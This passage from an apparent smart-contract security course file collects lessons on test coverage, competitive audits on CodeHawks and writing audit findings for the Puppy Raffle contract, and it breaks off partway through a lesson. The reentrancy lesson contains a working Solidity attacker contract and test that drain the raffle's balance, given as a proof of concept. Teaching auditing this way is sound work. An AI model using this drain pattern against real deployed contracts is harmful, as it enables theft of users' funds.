        raw_markdown_url: /routes/security/4-puppy-raffle/42-test-coverage/+page.md
        markdown_content: |-
          ---
          title: Test Coverage
          ---

          _Follow along with this video:_

          ---

          ### Checking Coverage

          Alright! Let's see where we're at in our roadmap

          ```
          Slither ‚úÖ
          Aderyn ‚úÖ
          Code Quality/Tests
          ---
          Reporting
          - Competitive Audits
              - Submit a finding
          - Puppy Raffle Report incl. PoC
          ```

          Test coverage is up next, this should be easy.

          > **Remember:** you can check test coverage with the command `forge coverage`.

          <img src="../../../../static/security-section-4/42-test-coverage/test-coverage1.png" width="100%" height="auto">

          This is ... pretty bad. In the context of a competitive audit, this may be less important, but in a private audit we should absolutely be calling this out as an informational. Assuring a repo has an adequate test coverage helps a protocol avoid overlooking areas of their code.

          In the next lesson, we'll be going over some details to ready ourselves for writing this report. Exciting!
        description: 'Code Coverage Check Using Foundry, Aderyn & Slither'
      -
        id: 605f8320-1990-46eb-9a42-8ec0f0b978a5
        type: new_lesson
        enabled: true
        title: 'Phase 4: Reporting primer'
        slug: phase-4-reporting-primer
        duration: 3
        video_url: Jsp4X635wKDgIIYVDaoduT02qoDZgaQMvikfwJsy49PY
        raw_markdown_url: /routes/security/4-puppy-raffle/43-phase-4-reporting-primer/+page.md
        markdown_content: |-
          ---
          title: Phase 4 Reporting - Primer
          ---

          _Follow along with this video:_

          ---

          ### Writing the Report

          As was mentioned before - you can always look at one more line of code, but at some point, you got to _write the report_.

          Now, we're satisfied with our review, we're happy with the job we did. Lets write things up. We're going to go through the report together again as this is a crucial skill for your future security researcher career.

          In audits and especially in bug bounties, it is your obligation to convince the protocol of the importance of your finding and the need for it to be fixed. Writing detailed and thorough audit reports is the avenue through which we do this.

          BUT. Before we walkthrough another report, I want to introduce you to competitive audits. We're going to go over what they are, how they differ from private audits and how to submit a finding for them.

          <img src="/security-section-4/43-reporting-primer/reporting-primer1.svg" width="75%" height="auto">

          ---

          For now - if you've been binging this course, I want you to pause and go for a walk. It's time to take a break and reward ourselves for how far we've come. We've learnt so much, and we've so much more to go.

          See you after your break!
        description: 'Learn report writing for security reviews & effective communication in bug bounties with Patrick. Master competitive audits & finding submission.'
      -
        id: ecc11bfc-759f-4cd7-9056-9de865bdbb07
        type: new_lesson
        enabled: true
        title: 'What is a competitive audit?'
        slug: what-is-a-competitive-audit
        duration: 5
        video_url: dsk3T5vbxU02jH492Jcf9ZY8fWsTRw01Rm00rOn02CNzXBo
        raw_markdown_url: /routes/security/4-puppy-raffle/44-what-is-a-competitive-audit/+page.md
        markdown_content: |-
          ---
          title: What is a Competitive Audit?
          ---

          _Follow along with this video:_

          ---

          ### Competitive vs Private Audits

          Before we get to our report, I want to illustrate what a competitive audit is, and how it may differ from a private audit.

          **_What is a competitive audit?_**

          Unlike a private audit, where a single security researcher (or a small team) would be working with a protocol directly, a competitive audit sees a protocol making their code base publicly available and having people compete to find vulnerabilities within it.

          I encourage you to checkout some of the past competitive audits on [**CodeHawks**](https://www.codehawks.com/contests), you can click 'View Final Report' To see a compilation of all the findings in a contest, who found it etc.

          In a competitive audit, you're competing to find _bugs_, you're paid if you find vulnerabilities.

          We can see how these payouts work by looking at the [**CodeHawks Docs**](https://docs.codehawks.com/). Findings rewards are ultimately broken down into shares and severity, where the system rewards finding more unique, difficult to find bugs.

          <img src="/security-section-4/44-what-is-a-competitive-audit/competitive-audit1.png" width="75%" height="auto">

          You can also find examples of scenarios and calculations on the [**CodeHawks Docs**](https://docs.codehawks.com/hawks-auditors/payouts).

          **_How good are competitive audits?_**

          The quality of competitive audits has been found to be - incredible. To use a past contest on CodeHawks as an example, the Beedle-Fi audit resulted in a staggering number of findings.

          <img src="/security-section-4/44-what-is-a-competitive-audit/competitive-audit2.png" width="75%" height="auto">

          Security reviews of this nature consistently find more bugs that private reviews _and_ they serve as the perfect platforms to gain experience and build your security researcher career.

          Many top security researchers started their careers in this space, and continue to compete in competitive audits throughout.

          Competitive audits are a tonne of fun, you can learn lots and of course you can win money.

          **_How do I start with competitive audits?_**

          I'm glad you asked! CodeHawks hosts events called [**First Flights**](https://www.codehawks.com/first-flights), and we're going to have you do some of these!

          First Flights are simplified code bases (just like Puppy Raffle) that have been built specifically to ease newcomers into the auditing process, familiarize them with how competitive audits work and afford auditors an effective avenue through which to learn and grow their skills with real world experience.

          One additional benefit to using competitive audits as a platform to improve your skills is, once one concludes, all the validated findings are viewable, allowing an auditor to see which vulnerabilities they missed and how others are reporting their findings. This is hugely valuable for those looking to expand their skills.

          In the next lesson we'll sign up for CodeHawks together!
        description: "Competitive Audits - Discover Bugs, Win Rewards! Get started with Patrick's guidance, perfect for aspiring smart contract security professionals."
      -
        id: 9c485ab8-c99e-4dec-8dfc-267bdf536d45
        type: new_lesson
        enabled: true
        title: Codehawks
        slug: codehawks
        duration: 3
        video_url: Gv5m01IMiIMtnj6fxfgjNc7twPYTNNeJsqVVcleHUVTg
        raw_markdown_url: /routes/security/4-puppy-raffle/45-codehawks/+page.md
        markdown_content: |-
          ---
          title: CodeHawks
          ---

          _Follow along with this video:_

          ---

          ### Getting Ready to Compete

          With a better understanding of what a competitive audit is, I'll tell you - you have the skills _right now_ to start competing and start participating in some of these contests, especially First Flights.

          Don't hesitate to jump in and get as much experience actually going through these processes as you can.

          ### Sign Up

          Your first step, of course will be to sign up to CodeHawks and create an account. You can begin by clicking `Become a Hawk` on the [**CodeHawks Homepage**](https://www.codehawks.com/)

          <img src="/security-section-4/45-codehawks/codehawks1.png" style="width: 75%; height: auto;">

          Connect the browser wallet of your choice when prompted and then fill out your profile information.

          <img src="/security-section-4/45-codehawks/codehawks2.png" style="width: 75%; height: auto;">

          > **Note:** CodeHawks pays out on Arbitrum in USDC, so ensure you're using an EVM compatible wallet to receive rewards!

          Once your details are entered, click the `Sign Up` button at the bottom, your wallet will pop up and you'll be prompted to sign a transaction (no fees).

          You'll then receive a notification to verify your email, but following that **you're all done!** That's all it takes to get started with participating in competitive audits on the CodeHawks platform, and you already possess the basic skills to get involved.

          Let's go over how to submit a finding in a competitive audit so you're truly prepared to jump in!
        description: 'Join CodeHawks for Competitive Audits & practice. Live competitions, real $$$.'
      -
        id: 90ec3130-455a-483a-b279-35da3f014021
        type: new_lesson
        enabled: true
        title: 'Submitting a competitive audit finding'
        slug: submitting-a-competitive-audit-finding
        duration: 4
        video_url: YV9pYv100656yG01SMMkSMji8qMe5xu4tCUPvQ9BOcYfQ
        raw_markdown_url: /routes/security/4-puppy-raffle/46-submitting-a-competitive-audit-finding/+page.md
        markdown_content: |-
          ---
          title: Submitting a Competitive Audit Finding
          ---

          _Follow along with this video:_

          ---

          ### Submitting a Competitive Audit Finding

          We've come a long way in this guide, and now it's time to learn how to submit your findings in a CodeHawks competitive audit. As you follow along with me, remember that your write-ups need to demonstrate your skills and abilities as a security researcher. The better quality they are, the more chances you stand to earn additional rewards.

          > **Note:** In this lesson we walkthrough submitting a finding in a CodeHawks First Flight. First Flights are held every two weeks generally, so if one isn't currently accepting submissions, be sure to come back!

          Navigate to an active CodeHawks First Flight and click the link `Submit a Finding`.

          <img src="/security-section-4/46-submitting-competitive-finding/submitting-competitive-finding1.png" style="width: 75%; height: auto;">

          Some of this should seem very familiar. We can enter a title and choose an appropriate severity.

          - The title of a competitive audit submission can omit the [S-#] categorization. This will ultimately be prepended by judges if the report is deemed valid.
          - Remember: a good title is comprised of Root Cause + Impact!

          For `Relevant GitHub Links`, we're meant to provide a link, not just to the code base/contract, but to the specific lines we've identified as problematic. Using our DoS Vulnerability from `PuppyRaffle.sol` as an example, we can link directly to the loop in our `enterRaffle` function by right-clicking the line in GitHub and chooosing `copy permalink`.

          <img src="/security-section-4/46-submitting-competitive-finding/submitting-competitive-finding2.png" style="width: 75%; height: auto;">

          Take some time to view the README of the First Flight you're looking at. You'll find important information for the contest available such as:

          - Start/End dates and times
          - Prize Distributions
          - Audit Scope
          - Compatibilities
          - Roles

          Now we reach the `Finding` section of the submission. You'll see a basic template provided to you. It's entirely acceptable to overwrite this template and paste the reports formatted as we've learnt so far into this field.

          Once our write up looks good, we can even select `Preview` at the top to see what it looks like with formatting applied.

          > **Note:** Proof of Concept/Code are nearly _mandatory_ to be considered a good submission.

          Once you're satisfied with how things look, click `Submit Finding`. This should route you to `My Report` when you can see a summary of everything you've submitted for the audit so far. You can also make modifications to your submitted findings while the contest is open.

          ### The Selected Report

          Something to always strive for is quality in the write ups you submit. In competitive audits submitting a finding that is a duplicate with other auditors is common. Platforms will reward an attention to submission quality by choosing a `selected report`. This reports represent the best quality write up for a given vulnerability and these reports receive _bonus payouts_.

          <img src="/security-section-4/46-submitting-competitive-finding/submitting-competitive-finding4.png" style="width: 75%; height: auto;">

          ### Wrap Up

          Once a First Flight or Competitive Audit concludes, you'll be able to navitgate to `My Findings` in CodeHawks and download your submissions in markdown. It's worthwhile to add these to your portfolio to show your skills and experience to the world!

          That's all there is to submitting to a competitive audit! From there a judge will take over. Be sure to sign up to CodeHawks, I promise you that participating in competitive audits and First Flights will supercharge your abilities as a security researcher.

          Let's start finally writing things up in the next lesson!
        description: 'Patrick demonstrates how to submit findings in a competitive audit, emphasizing the importance of building your auditing portfolio.'
      -
        id: c7def483-fe9d-4db3-bcd1-33aa4330af86
        type: new_lesson
        enabled: true
        title: 'Reporting templates'
        slug: reporting-templates
        duration: 3
        video_url: 022dgMG01duWP2i9vBhErS01cnYDKAPvM8SCL93hjaT1bk
        raw_markdown_url: /routes/security/4-puppy-raffle/47-reporting-templates/+page.md
        markdown_content: |-
          ---
          title: Reporting - Templates
          ---

          _Follow along with this video:_

          ---

          ### Reporting Templates

          Throughout this course we have been, and will continue to use our [**audit-report-templating**](https://github.com/Cyfrin/audit-report-templating) repo to assist us with generating our final findings reports. I wanted to take a moment to make you aware of some alternatives, should you wish to try them out.

          ### Cyfrin GitHub Report Template

          [**audit-repo-cloner**](https://github.com/Cyfrin/audit-repo-cloner)

          On the Cyfrin team, we won't write up reports in markdown, we actually report our findings through issues directly on the GitHub repo, this is beneficial for collaborative situations. We use this repo cloner to prepare a repo for an audit by the Cyfrin team. From the README:

          ```
          It will take the following steps:

          1. Take the source repository you want to set up for audit
          2. Take the target repository name you want to use for the private --repo
          3. Add an issue_template to the repo, so issues can be formatted as audit findings, like:

          '''
          **Description:**
          **Impact:**
          **Proof of Concept:**
          **Recommended Mitigation:**
          **[Project]:**
          **Cyfrin:**
          '''

          4. Update labels to label issues based on severity and status
          5. Create an audit tag at the given commit hash (full SHA)
          6. Create branches for each of the auditors participating
          7. Create a branch for the final report
          8. Add the report-generator-template to the repo to make it easier to compile the report, and add a button in GitHub actions to re-generate the report on-demand
          9. Attempt to set up a GitHub project board
          ```

          ### Report Generator Template

          [**report-generator-template**](https://github.com/Cyfrin/report-generator-template)

          This is a fork of the [**Spearbit Report Generator**](https://github.com/spearbit-audits/report-generator-template) and is used to consolidate issues/projects on a GitHub repo into a PDF Audit report.

          From the README:

          ```
          This repository is meant to be a single-step solution to:

          - Fetch all issues from a given repository
          - Sort them by severity according to their labels
          - Generate a single Markdown file with all issues sorted by descending severity
          - Integrate that Markdown file into a LaTeX template
          - Generate a PDF report with all the issues and other relevant information

          ```

          These tools/templates are especially great when working with a team. They save you from having to manually consolidate markdown write ups. If this is a method you'd like to try in your own auditing process, I encourage you to experiment and determine what works best for you!

          For the purposes of this course, we'll continue with the methods we've been using thus far.

          Now, we won't _always_ be writing the reports together, but it's imperative that you put in the time to practice. The ability to create high quality reports is necessary for becoming a successful security researcher. Practice, get good at it. Get comfortable with `Proofs of Concept/Code`.

          Let's finally get to writing this one together though!
        description: 'Introducing some useful templates and processes for audit reporting.'
      -
        id: 813dc962-8458-4d4d-9a82-8abf3d92639e
        type: new_lesson
        enabled: true
        title: 'Reporting: Floating pragma'
        slug: reporting-floating-pragma
        duration: 2
        video_url: lnhM01BzVd3rWWQASg0000WHDbAFWNbR3jivlVTOvtQCv00
        raw_markdown_url: /routes/security/4-puppy-raffle/48-reporting-floating-pragma/+page.md
        markdown_content: |-
          ---
          title: Reporting - Floating Pragma
          ---

          _Follow along with this video:_

          ---

          ### Floating Pragma

          The first finding we're going to add to our `findings.md` comes from our notes on `floating pragma`. Remember, we can look through the repo for notes we've left by searching for our `@Audit` tag.

          This one should be easy for us as `Aderyn` caught it, and did most of the write up for us. Lets look at what `Aderyn` output.

          ````
          ## L-2: Solidity pragma should be specific, not wide

          Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

          - Found in src/PuppyRaffle.sol [Line: 3](src/PuppyRaffle.sol#L3)

          	```solidity
          	pragma solidity ^0.7.6;
          	```
          ````

          At this point you may wish to copy the [**finding_layout.md**](https://github.com/Cyfrin/4-puppy-raffle-audit/blob/audit-data/audit-data/finding_layout.md) template we've been following into your audit repo.

          `Aderyn's` output actually looks really great. I personally would rate this as an informational, so I'm going to make a few changes/formatting adjustments, but ultimately this is what it's going to look like, easy!

          ````
          ### I-1: Solidity pragma should be specific, not wide

          Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

          - Found in src/PuppyRaffle.sol [Line: 3](src/PuppyRaffle.sol#L3)

          	```solidity
          	pragma solidity ^0.7.6;
          	```
          ````

          Be sure to note your finding as actioned in your code base notes, and lets move onto the next one!

          ```js
          // report-written: use of floating pragma is bad!
          ```
        description: 'Walkthrough of the floating pragma informational finding report.'
      -
        id: a347c526-6e3d-4572-a6ff-f4d920f10680
        type: new_lesson
        enabled: true
        title: 'Reporting: Incorrect solc version'
        slug: reporting-incorrect-solc-version
        duration: 2
        video_url: im9q1Wpc901UCiih1BLDZg6ewD6McHGyv5GzzxzDkNXU
        raw_markdown_url: /routes/security/4-puppy-raffle/49-reporting-incorrect-solc-version/+page.md
        markdown_content: |-
          ---
          title: Reporting - Incorrect Solc Version
          ---

          _Follow along with this video:_

          ---

          ### Incorrect Solc Version

          The next finding we're going to write up is another `informational` it seems. We identified in an earlier lesson that Puppy Raffle is using an outdated version of Solidity!

          In this circumstance, `Slither` caught this one for us. It can often be valuable to pull from the Slither Documentation for references and recommendations for these types of findings. To add this to our `findings.md` it would look something like this:

          ```
          ### [I-2] Using an Outdated Version of Solidity is Not Recommended

          solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.
          Recommendation

          **Recommendations:**

          Deploy with any of the following Solidity versions:

              0.8.18

          The recommendations take into account:

              Risks related to recent releases
              Risks of complex code generation changes
              Risks of new language features
              Risks of known bugs

          Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

          ```

          I'll mention as well, I know we have a finding template - and we'll absolutely use it soon - but for informational findings, they're often simplistic enough that being less verbose is acceptable.

          Next lesson - Next vulnerability!
        description: 'Quick walkthrough of reporting an incorrect solc version.'
      -
        id: 1a7e975c-377d-4962-a28d-e9f95e774968
        type: new_lesson
        enabled: true
        title: 'Reporting: Unchanged state variables should be immutable or constant'
        slug: reporting-unchanged-state-variables-should-be-immutable-or-constant
        duration: 2
        video_url: 3LwLVQ5u74onsAKUEcWmSuZUzV2osOKQekJTC7YLVr4
        raw_markdown_url: /routes/security/4-puppy-raffle/50-reporting-unchanged-state-variables-should-be-immutable-or-constant/+page.md
        markdown_content: |-
          ---
          title: Reporting - Unchanged State Variables Should Be Immutable Or Constant
          ---

          _Follow along with this video:_

          ---

          ### Unchanged State Variables Should Be Constant or Immutable

          Searching for our @Audit comment again, it looks like the next finding we identified was:

          ```js
          // @Audit-Gas: raffleDuration doesn't change and should be immutable.
          ```

          Now, just a few lines further in the contract, we've also noted that several variables should be `constant`.

          ```js
          // @Audit-Gas: Unchanged state variables can be marked as constant
          string private commonImageUri = "ipfs://QmSsYRx3LpDAb1GZQm7zZ1AuHZjfbPkD6J7s9r41xu1mf8";
          string private rareImageUri = "ipfs://QmUPjADFGEKmfohdTaNcWhp7VGk26h5jXDA7v3VtTnTLcW";
          string private legendaryImageUri = "ipfs://QmYx6GsYAKnNzZ9A6NvEKV9nf1VaDzJrqDR23Y8YSkebLU";
          ```

          We should compile these into a single gas issue in our `findings.md` document.

          ```md
          #Gas

          ### [G-1] Unchanged state variables should be declared constant or immutable

          Reading from storage is much more expensive than reading a constant or immutable variable.

          Instances:

          - `PuppyRaffle::raffleDuration` should be `immutable`
          - `PuppyRaffle::commonImageUri` should be `constant`
          - `PuppyRaffle::rareImageUri` should be `constant`
          - `PuppyRaffle::legendaryImageUri` should be `constant`
          ```

          Great! Done! Make note in the contract that we've written up this finding and lets move on to the next.
        description: 'Learn how to track gas consumption and identify where improvements can be made. Focus on gas optimization techniques and proper variable scoping.'
      -
        id: 87a6e0ce-8924-4e56-93f5-c290141ba586
        type: new_lesson
        enabled: true
        title: 'Reporting: Zero address check'
        slug: reporting-zero-address-check
        duration: 1
        video_url: q02pwE2OhfpJ00v9uksMLGehGxntAB49Jx5Oz3ayhFiZI
        raw_markdown_url: /routes/security/4-puppy-raffle/51-reporting-zero-address-check/+page.md
        markdown_content: |-
          ---
          title: Reporting - Zero Address Check
          ---

          _Follow along with this video:_

          ---

          ### Zero Address Check

          We're flying through these! Next note that comes up when we search our `@Audit` tag is ...

          ```js
          constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) EERC721 ("Puppy Raffle, "PR""){
          // @Audit: check for zero address!
          ...
          }
          ```

          This is another finding `Aderyn` caught for us, we can just copy and paste this write up into our report like so:

          ````md
          ### [I-3] Missing checks for `address(0)` when assigning values to address state variables

          Assigning values to address state variables without checking for `address(0)`.

          - Found in src/PuppyRaffle.sol [Line: 69](src/PuppyRaffle.sol#L69)

            ```solidity
                    feeAddress = _feeAddress;
            ```

          - Found in src/PuppyRaffle.sol [Line: 159](src/PuppyRaffle.sol#L159)

            ```solidity
                    previousWinner = winner;
            ```

          - Found in src/PuppyRaffle.sol [Line: 182](src/PuppyRaffle.sol#L182)

            ```solidity
                    feeAddress = newFeeAddress;
            ```
          ````

          Leveraging our tools is a great way to speed up the write up process. Thanks, `Aderyn`! Mark the note as complete and we'll move on to the next finding!

          ```js
          constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) EERC721 ("Puppy Raffle, "PR""){
          // @Written: check for zero address!
          ...
          }
          ```
        description: 'Patrick explains zero address check and walks through reporting it.'
      -
        id: b05095c5-9cdf-4737-8c9e-1c9c3d6b7156
        type: new_lesson
        enabled: true
        title: 'Reporting: Storage variables in loops should be cached'
        slug: reporting-storage-variables-in-loops-should-be-cached
        duration: 2
        video_url: 3xflgJsmhwWq4yQLCFsAN302kr9rwu01dlgyRsrMebfp00
        raw_markdown_url: /routes/security/4-puppy-raffle/52-reporting-storage-variables-in-loops-should-be-cached/+page.md
        markdown_content: |-
          ---
          title: Reporting - Storage Variables In Loops Should Be Cached
          ---

          _Follow along with this video:_

          ---

          ### Storage Variables in a Loop Should be Cached

          Searching again for our `@Audit` tag, we should next come across

          ```js
          // @Audit-Gas: uint256 playerLength = players.length
          ```

          This finding is pointing to a waste of gas incurred by having to always read from storage. In the `enterRaffle` function, Puppy Raffle is checking for duplicates in an inefficient way. We were going to recommend removing this check entirely elsewhere, but we should still report this gas issue.

          ````md
          ### [G-2] Storage Variables in a Loop Should be Cached

          Everytime you call `players.length` you read from storage, as opposed to memory which is more gas efficient.

          ```diff
          + uint256 playersLength = players.length;
          - for (uint256 i = 0; i < players.length - 1; i++) {
          + for (uint256 i = 0; i < playersLength - 1; i++) {
          -    for (uint256 j = i + 1; j < players.length; j++) {
          +    for (uint256 j = i + 1; j < playersLength; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
          }
          }
          ```
          ````

          Using a diff shows clearly what adjustments should be made to optimized for gas.

          Next finding!
        description: 'Optimize gas usage via caching store variables in loops, read memory instead of storage for efficiency.'
      -
        id: aa20a390-002b-4fb2-b7fe-10459f334b3c
        type: new_lesson
        enabled: true
        title: "Reporting Findings We'll Cover Later"
        slug: "reporting-findings-we'll-cover-later"
        duration: 1
        video_url: iW7Xulrh3BtIZ01E0101y4G9OKJ300wdyx6TGuw9kWs7sp4
        raw_markdown_url: "/routes/security/4-puppy-raffle/53-reporting-findings-we'll-cover-later/+page.md"
        markdown_content: |-
          ---
          title: Reporting - Findings We'll Cover Later
          ---

          _Follow along with this video:_

          ---

          The next time you search your `@Audit` tag, you may come across a note I briefly mentioned on an MEV vulnerability in Puppy Raffle's `refund` function.

          ```js
          function refund(uint256 playerIndex) public {
              // @Audit: MEV
              address playerAddress = players[playerIndex];
              require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
              require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
              // slither-disable-next-line reentrancy-no-eth,reentrancy-events
              payable(msg.sender).sendValue(entranceFee);

              players[playerIndex] = address(0);
              emit RaffleRefunded(playerAddress);
              }
          ```

          We're actually going to skip this one for now. MEV's are something we'll return to later in the course to gain a deeper understanding of how they work.

          For now, just mark this note as skipped and we'll continue to the next vulnerability.
        description: 'Audit Findings: MEV Attacks & Refund Function - To be covered later (Section 7.5)'
      -
        id: a8dc1aa0-fbfd-4f90-bf52-13a07322c785
        type: new_lesson
        enabled: true
        title: 'Reporting Reentrancy'
        slug: reporting-reentrancy
        duration: 8
        video_url: QM9fgv9GOhI02Hv00cbvVTAZc4dDLQtXVGDjoVlhQ002OA
        raw_markdown_url: /routes/security/4-puppy-raffle/54-reporting-reentrancy/+page.md
        markdown_content: |-
          ---
          title: Reporting - Reentrancy
          ---

          _Follow along with this video:_

          ---

          ### Reporting Reentrancy

          The next finding on our list is `reentrancy`, we finally get to write this up!

          We know this is going to be a high, based on everything we went over and all we learnt about this vulnerability. Keeping in mind `<ROOT CAUSE> + <IMPACT>`, lets write a suitable title.

          ---

          **Title:**

          ```
          ### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance
          ```

          > **Note:** It's often a good idea to go through the steps of building a PoC to prove an issue before taking the time to write things up. We wrote a test for reentracy, that we'll be using, earlier.

          On to the next parts of the report template.

          ---

          For our description, we want to detail the specifics of the vulnerability, where it's located and the impact it has, using code snippets is a great way to point to trouble areas being discussed.

          ````

          **Description:** The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result, enables participants to drain the contract balance.

          In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that call do we update the `PuppyRaffle::players` array.

          ```js
          function refund(uint256 playerIndex) public {
              address playerAddress = players[playerIndex];
              require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
              require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

          @>  payable(msg.sender).sendValue(entranceFee);
          @>  players[playerIndex] = address(0);

              emit RaffleRefunded(playerAddress);
          }
              ```
          ````

          ---

          Next up is impact, let's clearly detail the effect of this vulnerability being exploited.

          ```
          **Impact:** All fees paid by raffle entrants could be stolen by a malicious participant.
          ```

          Simple enough.

          ---

          Fortunately we wrote a test for the reentrancy vulnerability earlier, so we can absolutely paste that here. I like to explicitly walk through the steps of the exploit as well.

          ````
          **Proof of Concept:**

          1. User enters the raffle
          2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
          3. Attacker enters the raffle
          4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the PuppyRaffle balance.

          <details>
          <summary>PoC Code</summary>

          Add the following to `PuppyRaffle.t.sol`

              ```js
          contract ReentrancyAttacker {
              PuppyRaffle puppyRaffle;
              uint256 entranceFee;
              uint256 attackerIndex;

              constructor(PuppyRaffle _puppyRaffle) {
                  puppyRaffle = _puppyRaffle;
                  entranceFee = puppyRaffle.entranceFee();
              }

              function attack() public payable {
                  address[] memory players = new address[](1);
                  players[0] = address(this);
                  puppyRaffle.enterRaffle{value: entranceFee}(players);
                  attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
                  puppyRaffle.refund(attackerIndex);
              }

              function _stealMoney() internal {
                  if (address(puppyRaffle).balance >= entranceFee) {
                      puppyRaffle.refund(attackerIndex);
                  }
              }

              fallback() external payable {
                  _stealMoney();
              }

              receive() external payable {
                  _stealMoney();
              }
          }

          // test to confirm vulnerability
          function testCanGetRefundReentrancy() public {
              address[] memory players = new address[](4);
              players[0] = playerOne;
              players[1] = playerTwo;
              players[2] = playerThree;
              players[3] = playerFour;
              puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

              ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
              address attacker = makeAddr("attacker");
              vm.deal(attacker, 1 ether);

              uint256 startingAttackContractBalance = address(attackerContract).balance;
              uint256 startingPuppyRaffleBalance = address(puppyRaffle).balance;

              // attack

              vm.prank(attacker);
              attackerContract.attack{value: entranceFee}();

              // impact
              console.log("attackerContract balance: ", startingAttackContractBalance);
              console.log("puppyRaffle balance: ", startingPuppyRaffleBalance);
              console.log("ending attackerContract balance: ", address(attackerContract).balance);
              console.log("ending puppyRaffle balance: ", address(puppyRaffle).balance);
          }
              ```
          </details>
          ````

          ---

          Last part - Recommendation. We know this, this protocol should be following CEI.

          ````
          **Recommendation:** To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally we should move the event emission up as well.

              ```diff
              function refund(uint256 playerIndex) public {
                  address playerAddress = players[playerIndex];
                  require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
                  require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
              +   players[playerIndex] = address(0);
              +   emit RaffleRefunded(playerAddress);
                  payable(msg.sender).sendeValue(entranceFees);
              -   players[playerIndex] = address(0);
              -   emit RaffleRefunded(playerAddress);
              }
              ```
          ````

          ---

          Great! That's all there is to our `reentrancy` report. Be sure to mark these audit notes as actioned and we'll move on to the next vulnerability!
        description: 'How to write a security review finding for a reentrancy vulnerability including a mitigation recommendation.'
      -
        id: 565e190d-95f9-4d4f-9091-637e52e2c61c
        type: new_lesson
        enabled: true
        title: 'Reporting: getActivePlayerindex'
        slug: reporting-getActivePlayerIndex-incorrect-for-edge-case
        duration: 5
        video_url: rrpN3S3H02pZ00xmnNhg6juOKj02otr5I28KnTc27I7x01A
        raw_markdown_url: /routes/security/4-puppy-raffle/55-reporting-getActivePlayerIndex-incorrect-for-edge-case/+page.md
        markdown_content: |-
          ---
          title: Reporting - getActivePlayerIndex Incorrect For Edge Case
          ---

          _Follow along with this video:_

          ---

          ### getActivePlayerIndex Incorrect for Edge Case

          Next finding we marked down was regarding `getActivePlayerIndex`. The issue we outlined here was, if a player exists at index 0, they may erroneously believe they are not entered into the raffle.

          Let's begin the write up with a title. There's some argument to be had that a vulnerability of this nature would be `Medium Severity`. If we consider however, that the impact is really only affecting a single user, `Low` could be appropriate as well, noting that the likelihood is a bit of a toss up - is it high, because it certainly happens if player[0] calls this function, or is it low because _only_ player[0] can call this function?

          Ultimately we're going to record this as a low. My title is going to look like so:

          ```
          [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existant players and players at index 0 causing players to incorrectly think they have not entered the raffle
          ```

          Root Cause. Impact. Classic. üòÜ

          NEXT, DESCRIPTION! Define where the bug is and how it's encountered/exploited.

          ````
          **Description:** If a player is in the `PuppyRaffle::players` array at index 0, this will return 0, but according to the natspec it will also return zero if the player is NOT in the array.


              ```js
              function getActivePlayerIndex(address player) external view returns (uint256) {
                  for (uint256 i = 0; i < players.length; i++) {
                      if (players[i] == player) {
                          return i;
                      }
                  }
                  return 0;
              }
              ```
          ````

          Impact. Let's spell out the practical effect of this bug

          ```
          **Impact:** A player at index 0 may incorrectly think they have not entered the raffle and attempt to enter the raffle again, wasting gas.
          ```

          A Proof of Code/Concept is something we should always strive to include in our reports. For `Low Severity` issues however, it may not be necessary to extraneously include test cases et al for what are otherwise simple to describe issues.

          For this report, I'm just going to outline the steps that lead to encountering the vulnerability.

          ```
          **Proof of Concept:**

          1. User enters the raffle, they are the first entrant
          2. `PuppyRaffle::getActivePlayerIndex` returns 0
          3. User thinks they have not entered correctly due to the function documentation
          ```

          As for mitigations, there are a few things that could solve this issue for the protocol. There's no reason to limit ourselves to just one.

          ```
          **Recommendations:** The easiest recommendation would be to revert if the player is not in the array instead of returning 0.

          You could also reserve the 0th position for any competition, but an even better solution might be to return an `int256` where the function returns -1 if the player is not active.
          ```

          Done!

          ### Wrap Up

          We're getting really quick at these write ups now. You can see that the severity of an issue uncovered often pertains to the complexity of it's write up.

          We've a few more reports to complete, lets keep going.
        description: 'Walkthrough of a report for our getActivePlayerIndex edge case!'
      -
        id: 9b6aa31f-a11a-43d3-ac79-5361ac447c50
        type: new_lesson
        enabled: true
        title: 'Reporting: Should Follow CEI'
        slug: reporting-should-follow-cei
        duration: 2
        video_url: UH4i6O3jqmRTqQoVPkonfZdrpy01Gd00DQEHbAZMt7WEk
        raw_markdown_url: /routes/security/4-puppy-raffle/56-reporting-should-follow-cei/+page.md
        markdown_content: |-
          ---
          title: Reporting - Should Follow CEI
          ---

          _Follow along with this video:_

          ---

          ### selectWinner Should Follow CEI

          Taking a look at our next `@Audit` tag, this finding should be another quick one. We'd identified that the `selectWinner` function was another instance where PuppyRaffle isn't following CEI (Checks, Effects, Interactions). However, unlike our `reentrancy` situation, there doesn't seem to be a way to exploit it in `selectWinner`. Resultingly, this is going to be our 4th `informational`.

          ````
          **Title:** [I-4] does not follow CEI, which is not a best practice

          It's best to keep code cleaen and follow CEI (Checks, Effects, Interactions).

              ```diff
          -   (bool success,) = winner.call{value: prizePool}("");
          -   require(success, "PuppyRaffle: Failed to send prize pool to winner");
                  _safeMint(winner, tokenId);
          +   (bool success,) = winner.call{value: prizePool}("");
          +   require(success, "PuppyRaffle: Failed to send prize pool to winner");
